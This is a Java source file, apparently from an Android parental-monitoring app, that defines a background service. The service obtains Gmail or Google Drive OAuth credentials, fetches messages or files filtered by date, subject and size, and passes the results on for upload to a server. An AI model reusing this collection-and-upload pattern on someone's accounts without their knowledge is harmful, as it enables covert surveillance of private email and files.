package com.kidguard.services;

import android.Manifest;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import com.google.api.client.googleapis.extensions.android.gms.auth.GoogleAccountCredential;
import com.google.api.client.util.ExponentialBackOff;
import com.google.api.services.drive.Drive;
import com.kidguard.MainActivity;
import com.kidguard.asynctask.MakeRequestDrive;
import com.kidguard.asynctask.MakeRequestEmail;
import com.kidguard.interfaces.Constant;
import com.kidguard.model.GoogleDrive;
import com.kidguard.model.Mail;
import com.kidguard.preference.Preference;

import java.util.ArrayList;
import java.util.Arrays;

import pub.devrel.easypermissions.AfterPermissionGranted;
import pub.devrel.easypermissions.EasyPermissions;

@SuppressWarnings("all")
public class GoogleAccountService extends Service implements Constant {
    private static GoogleAccountService services;

    /* Google Account Credential */
    private GoogleAccountCredential mCredential;
    private Context context;
    private String tag;
    private String count;
    private String dateFrom;
    private String dateTo;
    private String subject;
    private String size;

    public static GoogleAccountService getInstance() {
        return services;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        this.context = this;
        services = GoogleAccountService.this;
        //getGoogleAccount();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        tag = intent.getStringExtra(KEY_TAG);
        count = intent.getStringExtra(KEY_COUNT);
        dateFrom = intent.getStringExtra(KEY_DATE_FROM);
        dateTo = intent.getStringExtra(KEY_DATE_TO);
        subject = intent.getStringExtra(KEY_SUBJECT);
        size = intent.getStringExtra(KEY_SIZE);
        getGoogleAccount();
        return super.onStartCommand(intent, flags, startId);
    }

    /* Get Google Account */
    private void getGoogleAccount() {
        if (tag != null) {
            if (tag.equals(TAG_EMAIL)) {
                mCredential = GoogleAccountCredential.usingOAuth2(
                        getApplicationContext(), Arrays.asList(SCOPES_GMAIL))
                        .setBackOff(new ExponentialBackOff());
            } else {
                mCredential = GoogleAccountCredential.usingOAuth2(
                        getApplicationContext(), Arrays.asList(SCOPES_GOOGLE_DRIVE))
                        .setBackOff(new ExponentialBackOff());
            }
        } else {
            mCredential = GoogleAccountCredential.usingOAuth2(
                    getApplicationContext(), Arrays.asList(SCOPES_GMAIL))
                    .setBackOff(new ExponentialBackOff());
        }

        getResultsFromApi();
    }

    /* Get Results From Api */
    private void getResultsFromApi() {
        if (mCredential.getSelectedAccountName() == null) {

            chooseAccount();

        } else {
            if (tag.equals(TAG_EMAIL)) {
                new MakeRequestEmail(context, mCredential, count, dateFrom, dateTo, subject).execute();
            }
            else {
                new MakeRequestDrive(context, mCredential, count, dateFrom, dateTo, subject, size).execute();
            }
        }
    }

    @AfterPermissionGranted(REQUEST_PERMISSION_GET_ACCOUNTS)
    private void chooseAccount() {
        if (EasyPermissions.hasPermissions(
                this, Manifest.permission.GET_ACCOUNTS)) {
            String accountName = Preference.getAccountName(this);
            if (accountName != null) {
                mCredential.setSelectedAccountName(accountName);
                getResultsFromApi();

            } else {
                // Start a dialog from which the user can choose an account
                MainActivity.getInstance().startActivityForResult(
                        mCredential.newChooseAccountIntent(),
                        REQUEST_ACCOUNT_PICKER);
            }
        } else {

            // Request the GET_ACCOUNTS permission via a user dialog
            EasyPermissions.requestPermissions(
                    MainActivity.getInstance(),
                    "This app needs to access your Google account (via Contacts).",
                    REQUEST_PERMISSION_GET_ACCOUNTS,
                    Manifest.permission.GET_ACCOUNTS);
        }
    }


    /* Send EMAIL Data To Server */
    public void sendEmailDataToServer(ArrayList<Mail> lstEmail) {
        if (lstEmail != null && lstEmail.size() > 0) {
            BackgroundDataService.getInstance().sendEmailDataToServer(lstEmail);
        }
        stopSelf();
    }

    /* Send Google Drive Data To Server */
    public void sendGoogleDriveDataToServer(ArrayList<GoogleDrive> lstDrive, Drive mDrive) {
        if (lstDrive != null && lstDrive.size() > 0) {
            BackgroundDataService.getInstance().sendGoogleDriveDataToServer(lstDrive, mDrive);
        }
        stopSelf();
    }
}
